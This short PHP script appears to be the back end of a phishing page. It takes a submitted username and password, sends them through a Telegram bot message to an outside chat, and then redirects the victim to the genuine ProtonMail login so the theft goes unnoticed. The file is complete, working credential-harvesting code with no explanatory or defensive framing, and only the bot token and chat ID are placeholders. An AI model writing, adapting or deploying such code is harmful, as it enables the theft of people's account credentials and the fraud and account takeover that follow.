<?php
$msg = urlencode("Account: " . $_POST['username'] . " Pass: " . $_POST['password']);
$url="https://api.telegram.org/bot111111111:foobar/sendMessage?chat_id=12345&text=$msg";
$options=array(
    'http'=>array(
        'header'=>"Content-Type:application/x-www-form-urlencoded\r\n"
    )
);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
echo $result;
header('Location: https://mail.protonmail.com');
exit();
